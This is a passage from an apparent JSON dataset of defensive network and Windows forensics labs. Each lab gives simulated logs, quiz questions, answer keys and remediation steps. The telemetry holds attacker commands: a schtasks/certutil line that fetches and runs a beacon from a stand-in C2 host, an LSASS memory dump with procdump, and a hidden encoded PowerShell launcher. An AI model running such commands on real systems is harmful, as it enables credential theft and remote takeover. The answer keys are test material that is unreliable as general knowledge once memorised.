        "id": "t4",
        "prompt": "4. What cryptographic nonce is generated and sent by the Access Point in Message 1?",
        "expected": "ANonce",
        "acceptedKeywords": [
          "ANonce",
          "A-Nonce",
          "Authenticator Nonce"
        ],
        "hint": "Authenticator Nonce.",
        "explanation": "Expected: ANonce. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What 802.11 security standard introduces Protected Management Frames (PMF) to prevent deauth attacks?",
        "expected": "802.11w",
        "acceptedKeywords": [
          "802.11w",
          "PMF",
          "WPA3"
        ],
        "hint": "Standard ratifying management frame encryption.",
        "explanation": "Expected: 802.11w. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What MAC address belongs to the legitimate wireless Access Point?",
        "expected": "00:14:6c:7e:40:80",
        "acceptedKeywords": [
          "00:14:6c:7e:40:80"
        ],
        "hint": "Transmitter MAC in Frame 1.",
        "explanation": "Expected: 00:14:6c:7e:40:80. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Mandate WPA3-Enterprise with 802.11w Protected Management Frames (PMF) required, preventing unauthenticated spoofed deauth frames."
  },
  {
    "id": "lab-net-011",
    "category": "Network Forensics & Wireshark",
    "title": "SSH Brute-Force & Credential Stuffing Forensics",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Linux bastion host sshd logs indicate rapid connection attempts from a residential subnet with alternating usernames.",
    "telemetry": "Sep 29 03:12:01 bastion sshd[14201]: Failed password for root from 198.51.100.77 port 41202 ssh2\nSep 29 03:12:03 bastion sshd[14205]: Failed password for admin from 198.51.100.77 port 41204 ssh2\nSep 29 03:12:05 bastion sshd[14209]: Failed password for cadet from 198.51.100.77 port 41208 ssh2\nSep 29 03:12:07 bastion sshd[14214]: Failed password for support from 198.51.100.77 port 41210 ssh2\nSep 29 03:12:12 bastion sshd[14220]: Accepted password for deploy from 198.51.100.77 port 41216 ssh2\nStatus: Compromised account: deploy.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What attacking IP address launched the dictionary credential attack?",
        "expected": "198.51.100.77",
        "acceptedKeywords": [
          "198.51.100.77"
        ],
        "hint": "Source IP in sshd log.",
        "explanation": "Expected: 198.51.100.77. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. Which user account was successfully breached at 03:12:12?",
        "expected": "deploy",
        "acceptedKeywords": [
          "deploy",
          "user deploy"
        ],
        "hint": "Accepted password username in log.",
        "explanation": "Expected: deploy. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What default TCP port does the OpenSSH daemon listen on?",
        "expected": "22",
        "acceptedKeywords": [
          "22",
          "port 22"
        ],
        "hint": "Standard SSH port.",
        "explanation": "Expected: 22. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What daemon log file records SSH authentication attempts on Ubuntu/Debian systems?",
        "expected": "/var/log/auth.log",
        "acceptedKeywords": [
          "/var/log/auth.log",
          "auth.log"
        ],
        "hint": "Standard auth log location in Debian/Ubuntu.",
        "explanation": "Expected: /var/log/auth.log. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What utility dynamically bans IPs with repeated failed SSH authentication attempts?",
        "expected": "Fail2ban",
        "acceptedKeywords": [
          "Fail2ban",
          "fail2ban",
          "sshguard"
        ],
        "hint": "Common intrusion prevention log parser.",
        "explanation": "Expected: Fail2ban. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What OpenSSH setting in sshd_config disables password authentication entirely in favor of keys?",
        "expected": "PasswordAuthentication no",
        "acceptedKeywords": [
          "PasswordAuthentication no",
          "PasswordAuthentication",
          "no"
        ],
        "hint": "sshd_config directive setting password auth to no.",
        "explanation": "Expected: PasswordAuthentication no. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Lock the deploy account, terminate active SSH sessions for PID 14220, enforce SSH public key authentication only (PasswordAuthentication no), and bind Fail2ban."
  },
  {
    "id": "lab-net-012",
    "category": "Network Forensics & Wireshark",
    "title": "FTP Cleartext Exploit & Packet Extraction",
    "difficulty": "Beginner",
    "timeEst": "10 min",
    "xpReward": 110,
    "briefing": "Legacy maintenance equipment communicated with a backup storage repository using legacy FTP. Capture telemetry reveals sensitive credentials transmitted without encryption.",
    "telemetry": "TCP Stream 12:\n220 Tactical FTP Service Ready.\nUSER maintenance_svc\n331 Please specify the password.\nPASS Sup3rS3cur3M@1nt!\n230 Login successful.\nPORT 192,168,1,50,192,4\n200 PORT command successful. Consider using PASV.\nRETR radar_calibration_firmware.bin\n150 Opening BINARY mode data connection for radar_calibration_firmware.bin (4194304 bytes).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What username was transmitted in cleartext over the FTP control channel?",
        "expected": "maintenance_svc",
        "acceptedKeywords": [
          "maintenance_svc"
        ],
        "hint": "USER command argument.",
        "explanation": "Expected: maintenance_svc. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What password was disclosed in the cleartext PASS command?",
        "expected": "Sup3rS3cur3M@1nt!",
        "acceptedKeywords": [
          "Sup3rS3cur3M@1nt!"
        ],
        "hint": "PASS command argument.",
        "explanation": "Expected: Sup3rS3cur3M@1nt!. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What file was downloaded by the user using the RETR command?",
        "expected": "radar_calibration_firmware.bin",
        "acceptedKeywords": [
          "radar_calibration_firmware.bin"
        ],
        "hint": "RETR target filename.",
        "explanation": "Expected: radar_calibration_firmware.bin. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What standard port does the FTP control connection use?",
        "expected": "21",
        "acceptedKeywords": [
          "21",
          "port 21",
          "TCP 21"
        ],
        "hint": "Default FTP command port.",
        "explanation": "Expected: 21. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What secure encrypted alternative protocol should replace legacy FTP?",
        "expected": "SFTP",
        "acceptedKeywords": [
          "SFTP",
          "FTPS",
          "SSH File Transfer"
        ],
        "hint": "SSH File Transfer Protocol.",
        "explanation": "Expected: SFTP. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What FTP command initiates active mode data port negotiation?",
        "expected": "PORT",
        "acceptedKeywords": [
          "PORT",
          "PORT command"
        ],
        "hint": "Command passing IP and port octets.",
        "explanation": "Expected: PORT. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Deprecate unencrypted FTP immediately across the enclave, transition workloads to SFTP over SSH, and rotate maintenance_svc credentials."
  },
  {
    "id": "lab-net-013",
    "category": "Network Forensics & Wireshark",
    "title": "SNMP Default Community String Enumeration",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "An unauthenticated network probe polled perimeter switches via SNMPv1/v2c. Due to default community strings, internal network topology and device models were leaked.",
    "telemetry": "SNMP Request: GetNext-Request | 10.10.10.99 -> 10.10.10.1:161 | Community: \"public\"\nOID: 1.3.6.1.2.1.1.1.0 (sysDescr)\nSNMP Response: Get-Response | 10.10.10.1:161 -> 10.10.10.99 | Community: \"public\"\nValue: STRING: \"Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4\"\nSNMP Request: Get-Request | 10.10.10.99 -> 10.10.10.1:161 | Community: \"private\"\nValue: STRING: \"Write-Access-Granted\"",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What insecure default read-only community string was successfully accepted?",
        "expected": "public",
        "acceptedKeywords": [
          "public",
          "\"public\""
        ],
        "hint": "Most common default SNMP community name.",
        "explanation": "Expected: public. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What default write-access community string gave the attacker administrative control?",
        "expected": "private",
        "acceptedKeywords": [
          "private",
          "\"private\""
        ],
        "hint": "Default write string.",
        "explanation": "Expected: private. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What standard UDP port does SNMP agent listen on for polling queries?",
        "expected": "161",
        "acceptedKeywords": [
          "161",
          "UDP 161"
        ],
        "hint": "Default SNMP query port.",
        "explanation": "Expected: 161. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What version of Cisco IOS was disclosed in the sysDescr response?",
        "expected": "15.0(2)SE4",
        "acceptedKeywords": [
          "15.0(2)SE4",
          "15.0"
        ],
        "hint": "Version string in telemetry.",
        "explanation": "Expected: 15.0(2)SE4. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. Which SNMP version provides mandatory cryptographic encryption and user authentication?",
        "expected": "SNMPv3",
        "acceptedKeywords": [
          "SNMPv3",
          "v3",
          "SNMP v3"
        ],
        "hint": "Third version of SNMP standard.",
        "explanation": "Expected: SNMPv3. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What hierarchical identifier format (e.g. 1.3.6.1.2.1.1.1.0) defines managed objects?",
        "expected": "OID",
        "acceptedKeywords": [
          "OID",
          "Object Identifier"
        ],
        "hint": "Object Identifier.",
        "explanation": "Expected: OID. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Disable SNMPv1 and SNMPv2c across all network switches, migrate to SNMPv3 with authPriv (SHA-256 auth + AES-256 encryption), and restrict access via management ACLs."
  },
  {
    "id": "lab-net-014",
    "category": "Network Forensics & Wireshark",
    "title": "Stealth Port Scanning Signatures: FIN, NULL & Xmas Tree",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Intrusion Detection System (IDS) alerts triggered on abnormal TCP packet combinations that violate RFC 793 specifications, used by adversaries to bypass simple packet filters.",
    "telemetry": "Frame 1: 192.168.1.100 -> 10.0.0.5:22 TCP Flags: 0x000 (NULL Scan - No flags set)\nFrame 2: 192.168.1.100 -> 10.0.0.5:22 TCP Flags: [FIN] (FIN Scan)\nFrame 3: 192.168.1.100 -> 10.0.0.5:22 TCP Flags: [FIN, PSH, URG] (Xmas Scan - Lit up like a tree!)\nTarget Response: Port 22 remains silent (No RST returned, indicating Open port in RFC 793).\nPort 23: Returns [RST, ACK] (Closed port).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What scan type is characterized by having zero TCP flags set?",
        "expected": "NULL Scan",
        "acceptedKeywords": [
          "NULL",
          "NULL Scan"
        ],
        "hint": "Scan where flags = 0.",
        "explanation": "Expected: NULL Scan. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. Which three flags are simultaneously set in a classic Xmas tree scan?",
        "expected": "FIN, PSH, URG",
        "acceptedKeywords": [
          "FIN, PSH, URG",
          "FIN PSH URG",
          "URG, PSH, FIN"
        ],
        "hint": "Finish, Push, and Urgent.",
        "explanation": "Expected: FIN, PSH, URG. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What packet flag does a closed port return according to RFC 793?",
        "expected": "RST",
        "acceptedKeywords": [
          "RST",
          "RST-ACK",
          "Reset"
        ],
        "hint": "Reset flag.",
        "explanation": "Expected: RST. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What famous network scanner tool executes these stealth scans using switches -sN, -sF, and -sX?",
        "expected": "Nmap",
        "acceptedKeywords": [
          "Nmap",
          "nmap"
        ],
        "hint": "Industry-standard network exploration tool.",
        "explanation": "Expected: Nmap. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. Which operating system family ignores RFC 793 and sends RST for all ports, rendering FIN scans ineffective?",
        "expected": "Windows",
        "acceptedKeywords": [
          "Windows",
          "Microsoft Windows"
        ],
        "hint": "Microsoft desktop OS.",
        "explanation": "Expected: Windows. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What IDS rule keyword detects TCP flag combinations in Snort/Suricata?",
        "expected": "flags",
        "acceptedKeywords": [
          "flags",
          "tcp.flags"
        ],
        "hint": "Snort rule option for inspecting TCP control bits.",
        "explanation": "Expected: flags. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Deploy stateful firewall rules that drop invalid TCP flag combinations and alert on Nmap stealth scan signatures in Suricata/Snort."
  },
  {
    "id": "lab-end-001",
    "category": "Endpoint Security & Windows Internals",
    "title": "Windows Event ID 4625 Automated Brute-Force Triage",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Active Directory domain controllers reported thousands of authentication failures within a 60-second window. Extract the hostile workstation name, sub-status error code, and caller process.",
    "telemetry": "Log Name: Security | Event ID: 4625 | Keywords: Audit Failure\nDate: 2026-09-29 08:14:22 UTC | Computer: DC01.tactical.mil\nAccount For Which Logon Failed: Account Name: cadet_admin | Account Domain: TACTICAL\nFailure Information: Failure Reason: Unknown user name or bad password.\nStatus: 0xC000006D | Sub Status: 0xC000006A (Bad Password)\nNetwork Information: Workstation Name: KALI-ATTACKER | Source Network Address: 192.168.10.45\nProcess Information: Caller Process ID: 0x24c | Caller Process Name: C:\\Windows\\System32\\lsass.exe",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Windows Security Event ID corresponds to a failed account logon attempt?",
        "expected": "4625",
        "acceptedKeywords": [
          "4625",
          "Event 4625"
        ],
        "hint": "Standard Windows Audit Failure logon event code.",
        "explanation": "Expected: 4625. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What NTSTATUS sub-status code 0xC000006A specifically signifies?",
        "expected": "Bad Password",
        "acceptedKeywords": [
          "Bad Password",
          "incorrect password",
          "wrong password"
        ],
        "hint": "Sub status indicating username is valid but password was incorrect.",
        "explanation": "Expected: Bad Password. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What target account was being brute-forced by the adversary?",
        "expected": "cadet_admin",
        "acceptedKeywords": [
          "cadet_admin"
        ],
        "hint": "Account Name field in the telemetry.",
        "explanation": "Expected: cadet_admin. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What source IP address initiated the failed authentication attempts?",
        "expected": "192.168.10.45",
        "acceptedKeywords": [
          "192.168.10.45"
        ],
        "hint": "Source Network Address.",
        "explanation": "Expected: 192.168.10.45. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What was the declared Workstation Name of the attacking system?",
        "expected": "KALI-ATTACKER",
        "acceptedKeywords": [
          "KALI-ATTACKER"
        ],
        "hint": "Workstation Name field in the event log.",
        "explanation": "Expected: KALI-ATTACKER. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Windows Security Event ID indicates a SUCCESSFUL account logon?",
        "expected": "4624",
        "acceptedKeywords": [
          "4624",
          "Event 4624"
        ],
        "hint": "Companion event code for logon success.",
        "explanation": "Expected: 4624. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Configure Active Directory Account Lockout Policy (threshold 5 attempts), enforce MFA via Duo/Azure AD, and drop traffic from 192.168.10.45 on internal routers."
  },
  {
    "id": "lab-end-002",
    "category": "Endpoint Security & Windows Internals",
    "title": "LSASS Memory Dumping & Mimikatz Detection (Sysmon 10)",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Sysmon telemetry triggered an alert on an unprivileged process attempting to open a handle with PROCESS_ALL_ACCESS permissions to the Local Security Authority Subsystem Service (lsass.exe).",
    "telemetry": "Sysmon Event ID 10: ProcessAccess\nUtcTime: 2026-09-29 11:42:01.120\nSourceProcessId: 4892\nSourceImage: C:\\Users\\Public\\Downloads\\procdump.exe\nTargetProcessId: 648\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4f4|C:\\Windows\\System32\\KERNELBASE.dll+2be8e\nAdversary Command: procdump.exe -ma lsass.exe lsass.dmp",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What critical Windows system process manages credentials and security tokens in memory?",
        "expected": "lsass.exe",
        "acceptedKeywords": [
          "lsass.exe",
          "lsass",
          "LSASS"
        ],
        "hint": "Local Security Authority Subsystem Service binary.",
        "explanation": "Expected: lsass.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What Sysmon Event ID records ProcessAccess handles being opened across process boundaries?",
        "expected": "10",
        "acceptedKeywords": [
          "10",
          "Sysmon 10",
          "Event 10"
        ],
        "hint": "Sysmon ProcessAccess event number.",
        "explanation": "Expected: 10. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What utility binary was executed by the attacker to dump LSASS process memory?",
        "expected": "procdump.exe",
        "acceptedKeywords": [
          "procdump.exe",
          "procdump"
        ],
        "hint": "Sysinternals tool abused for memory dumping.",
        "explanation": "Expected: procdump.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What hex GrantedAccess permission indicates full administrative handle rights (PROCESS_ALL_ACCESS)?",
        "expected": "0x1FFFFF",
        "acceptedKeywords": [
          "0x1FFFFF",
          "1FFFFF"
        ],
        "hint": "Full access hex mask in Sysmon log.",
        "explanation": "Expected: 0x1FFFFF. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What Windows credential protection feature isolates LSASS in a virtualization-protected enclave?",
        "expected": "Credential Guard",
        "acceptedKeywords": [
          "Credential Guard",
          "LSA Protection",
          "RunAsPPL"
        ],
        "hint": "VBS-based Windows 10/11 enterprise feature.",
        "explanation": "Expected: Credential Guard. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What registry value RunAsPPL enables LSA Protected Process Light mode?",
        "expected": "1",
        "acceptedKeywords": [
          "1",
          "dword:00000001",
          "true"
        ],
        "hint": "Binary enable value for RunAsPPL.",
        "explanation": "Expected: 1. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Enable Windows Defender Credential Guard via Group Policy and set HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL=1."
  },
  {
    "id": "lab-end-003",
    "category": "Endpoint Security & Windows Internals",
    "title": "Unquoted Service Path & Windows Privilege Escalation",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "An audit of installed Windows services revealed a service binary path containing whitespace characters without enclosing quotation marks, allowing unprivileged write execution.",
    "telemetry": "Service Name: TacticalHealthAgent\nDisplay Name: Tactical Health Telemetry Monitor\nPath Name: C:\\Program Files\\Tactical Sensor\\Agent Folder\\sensor_agent.exe\nService Start Type: Auto Start\nService Account: LocalSystem\nDirectory Permissions on C:\\Program Files\\Tactical Sensor:\n  BUILTIN\\Users:(OI)(CI)(W) -> Standard users have Write / Create Files permissions!\nAdversary Action: Drop payload at C:\\Program Files\\Tactical.exe",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What classic Windows misconfiguration flaw is present in this service configuration?",
        "expected": "Unquoted Service Path",
        "acceptedKeywords": [
          "Unquoted Service Path",
          "unquoted",
          "unquoted path"
        ],
        "hint": "Path has spaces but lacks quotation marks.",
        "explanation": "Expected: Unquoted Service Path. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. When the service restarts, which binary name will Windows prioritize executing first due to space parsing?",
        "expected": "Tactical.exe",
        "acceptedKeywords": [
          "Tactical.exe",
          "C:\\Program Files\\Tactical.exe"
        ],
        "hint": "First space occurs after \"Tactical\".",
        "explanation": "Expected: Tactical.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What high-privilege account does the TacticalHealthAgent execute under?",
        "expected": "LocalSystem",
        "acceptedKeywords": [
          "LocalSystem",
          "SYSTEM",
          "NT AUTHORITY\\SYSTEM"
        ],
        "hint": "Service Account field.",
        "explanation": "Expected: LocalSystem. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What Windows built-in command query lists all installed services and paths?",
        "expected": "wmic service get name,displayname,pathname",
        "acceptedKeywords": [
          "wmic",
          "sc qc",
          "Get-Service"
        ],
        "hint": "WMIC service command.",
        "explanation": "Expected: wmic service get name,displayname,pathname. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What permission flag \"(W)\" on the directory enabled the cadet to plant a malicious binary?",
        "expected": "Write",
        "acceptedKeywords": [
          "Write",
          "write permissions"
        ],
        "hint": "Ability to create and write files.",
        "explanation": "Expected: Write. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What sc.exe command parameter corrects the service binary path?",
        "expected": "binPath=",
        "acceptedKeywords": [
          "binPath=",
          "binPath",
          "binpath"
        ],
        "hint": "sc config <service> binPath= ...",
        "explanation": "Expected: binPath=. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Wrap service binary paths in quotes: sc config TacticalHealthAgent binPath= \"\\\"C:\\Program Files\\Tactical Sensor\\Agent Folder\\sensor_agent.exe\\\"\" and remove Users (W) permissions."
  },
  {
    "id": "lab-end-004",
    "category": "Endpoint Security & Windows Internals",
    "title": "Windows Registry Run Keys & Persistence Mechanism Hunting",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "Adversaries maintain access across system reboots by registering binary paths in Windows Run keys. Identify the unauthorized startup entry placed by an impostor updater.",
    "telemetry": "Registry Hive: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nEntries:\n  OneDrive: \"C:\\Users\\cadet\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n  Teams: \"C:\\Users\\cadet\\AppData\\Local\\Microsoft\\Teams\\Update.exe\" --processStart \"Teams.exe\"\n  WindowsDefenderUpdater: \"C:\\Users\\cadet\\AppData\\Local\\Temp\\update_agent.vbs\" (ANOMALOUS)\nVBS File Content:\n  Set objShell = CreateObject(\"WScript.Shell\")\n  objShell.Run \"powershell.exe -WindowStyle Hidden -Enc aQB3AHI...\", 0, False",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What is the full registry key path commonly abused for user-level startup persistence?",
        "expected": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "acceptedKeywords": [
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "CurrentVersion\\Run",
          "Run"
        ],
        "hint": "HKEY_CURRENT_USER startup registry path.",
        "explanation": "Expected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. Which suspicious registry value name disguises the malicious script payload?",
        "expected": "WindowsDefenderUpdater",
        "acceptedKeywords": [
          "WindowsDefenderUpdater"
        ],
        "hint": "The masquerading entry name in telemetry.",
        "explanation": "Expected: WindowsDefenderUpdater. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What suspicious script file is executed from the user AppData\\Local\\Temp folder?",
        "expected": "update_agent.vbs",
        "acceptedKeywords": [
          "update_agent.vbs"
        ],
        "hint": "VBScript filename.",
        "explanation": "Expected: update_agent.vbs. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What PowerShell parameter executes commands encoded in base64 unicode string?",
        "expected": "-Enc",
        "acceptedKeywords": [
          "-Enc",
          "-EncodedCommand",
          "EncodedCommand"
        ],
        "hint": "PowerShell encoded command flag.",
        "explanation": "Expected: -Enc. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What PowerShell parameter hides the console window from the active logged-in user?",
        "expected": "-WindowStyle Hidden",
        "acceptedKeywords": [
          "-WindowStyle Hidden",
          "Hidden",
          "-W Hidden"
        ],
        "hint": "WindowStyle parameter.",
        "explanation": "Expected: -WindowStyle Hidden. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What Sysinternals tool provides comprehensive auditing of all Windows autostart locations?",
        "expected": "Autoruns",
        "acceptedKeywords": [
          "Autoruns",
          "autorunsc.exe",
          "autorunsc"
        ],
        "hint": "Famous Sysinternals autostart utility.",
        "explanation": "Expected: Autoruns. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Delete the WindowsDefenderUpdater value from HKCU Run key, purge update_agent.vbs from Temp, and inspect Autoruns for additional scheduled tasks."
  },
  {
    "id": "lab-end-005",
    "category": "Endpoint Security & Windows Internals",
    "title": "Scheduled Task Persistence & LOLBin Execution (schtasks.exe)",
    "difficulty": "Intermediate",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "SOC analysts discovered a scheduled task created with elevated privileges scheduled to run every day at midnight. Examine the task definition and command triggers.",
    "telemetry": "Command Executed: schtasks.exe /create /tn \"TacticalTelemetryUpdate\" /tr \"cmd.exe /c certutil.exe -urlcache -split -f http://hostile-c2.net/beacon.exe C:\\Windows\\Temp\\beacon.exe && C:\\Windows\\Temp\\beacon.exe\" /sc DAILY /st 00:00 /ru \"NT AUTHORITY\\SYSTEM\"\nTask XML Attributes:\n  Author: SYSTEM\n  Trigger: Daily at 00:00:00\n  Action: cmd.exe /c certutil.exe ...\n  Principal RunLevel: HighestAvailable",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What built-in Windows command-line utility was used to create the persistence task?",
        "expected": "schtasks.exe",
        "acceptedKeywords": [
          "schtasks.exe",
          "schtasks"
        ],
        "hint": "Windows task scheduling executable.",
        "explanation": "Expected: schtasks.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t2",
        "prompt": "2. What is the name of the malicious scheduled task created in this scenario?",
        "expected": "TacticalTelemetryUpdate",
        "acceptedKeywords": [
          "TacticalTelemetryUpdate"
        ],
        "hint": "/tn argument value.",
        "explanation": "Expected: TacticalTelemetryUpdate. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t3",
        "prompt": "3. What built-in Windows tool (LOLBin) was abused to download the beacon payload over HTTP?",
        "expected": "certutil.exe",
        "acceptedKeywords": [
          "certutil.exe",
          "certutil"
        ],
        "hint": "Certificate utility commonly abused for file downloads.",
        "explanation": "Expected: certutil.exe. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t4",
        "prompt": "4. What privileged security context was assigned to the scheduled task (/ru parameter)?",
        "expected": "NT AUTHORITY\\SYSTEM",
        "acceptedKeywords": [
          "NT AUTHORITY\\SYSTEM",
          "SYSTEM"
        ],
        "hint": "Highest local Windows account.",
        "explanation": "Expected: NT AUTHORITY\\SYSTEM. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t5",
        "prompt": "5. What directory under C:\\Windows was chosen by the adversary to stage the downloaded payload?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Staging folder path.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      },
      {
        "id": "t6",
        "prompt": "6. What command deletes the malicious scheduled task immediately?",
        "expected": "schtasks /delete /tn \"TacticalTelemetryUpdate\" /f",
        "acceptedKeywords": [
          "schtasks /delete",
          "schtasks /delete /tn TacticalTelemetryUpdate",
          "schtasks.exe /delete"
        ],
        "hint": "schtasks with /delete parameter.",
        "explanation": "Expected: schtasks /delete /tn \"TacticalTelemetryUpdate\" /f. Concept: Verified through Windows security architecture and MITRE ATT&CK telemetry."
      }
    ],
    "remediationGuide": "Delete task TacticalTelemetryUpdate via schtasks /delete /f, isolate host, delete C:\\Windows\\Temp\\beacon.exe, and restrict certutil.exe egress in AppLocker."
  },
  {
    "id": "lab-end-006",
    "category": "Endpoint Security & Windows Internals",
    "title": "WMI Event Subscription Persistence Hunting (Sysmon 19, 20, 21)",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 190,
    "briefing": "Advanced persistent threats utilize Windows Management Instrumentation (WMI) event subscriptions to execute arbitrary payloads when specific system events occur.",
